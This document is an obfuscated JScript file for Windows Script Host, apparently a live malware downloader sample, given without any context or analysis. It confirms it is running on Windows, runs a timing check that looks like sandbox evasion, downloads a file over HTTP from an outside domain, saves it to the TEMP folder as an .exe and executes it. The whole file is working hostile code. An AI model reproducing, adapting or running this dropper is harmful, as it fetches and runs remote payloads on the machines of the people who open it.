var g0 = false;
var h = "CreateObject";
var R = function n() {return WScript[h]("WScript.Shell");}(), l = 11;
var J = "MSXML2.XMLHTTP";
var K = 2123213;
var UT = 0;
function OD(Kp){R["Run"](Kp, UT, UT);};
function gL(){return "" + J;};
function vL(f, Ev){UT = UT * 1; return f - Ev;};
function sF(){return h;};
/*@cc_on
  @if (@_win32 || @_win64)
    g0 = true;
  @end
@*/
if (g0)
{
var Af = "";
function B(){return 22;};
var Zt = 0; var p = 0;
function y()
{
var m = new this["Date"]();
var A = m["getUTCMilliseconds"]();
WScript["Sleep"](B());
var m = new this["Date"]();
var c = m["getUTCMilliseconds"]();
WScript["Sleep"](B());
var m = new this["Date"]();
var Tr = m["getUTCMilliseconds"]();
var Zt = "g";
Zt = vL(c, A);
var p = "ji";
p = vL(Tr, c);
Af = "open";
return vL(Zt, p);
}
var xL = false;
var bj = false;
for (var Q = UT; Q < B() * 1; Q++){if (y() != UT){
xL = true; 
p = "31" + 11 * Zt + p; 
bj = true; 
break;
}}
function Wy() {return ((xL == true) && (xL == bj)) ? 1 : UT;};
if (xL && Wy() && bj){
function W() {return R["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "r0Dw8x5O.exe";};
 qu = gL();
 uP = WScript[h](qu);
 var H = 1;
 while (H){
try {
uP[Af]("GET", "http://cngfloristsundries.co.uk/mo4erp", false);
uP["send"]();
e = "Sleep";
for (;;){WScript[e](B() * 11); if (uP["readystate"] >= 2 * 2) break;};
H = UT;
} catch(xQ){};
}
function I(wO) {var mp = (1, 2, 3, 4, 5, wO); return mp;};
Jh = WScript[sF()]("ADODB.Stream");
qu = Jh;
qu[Af]();
qu["type"] = I(1);
qu["write"](uP["ResponseBody"]);
Jh["position"] = I(UT);
qu["Save" + "ToFile"](W(), 2);
Jh["c"+"lose"]();
Z = W();
OD(Z);
}
}

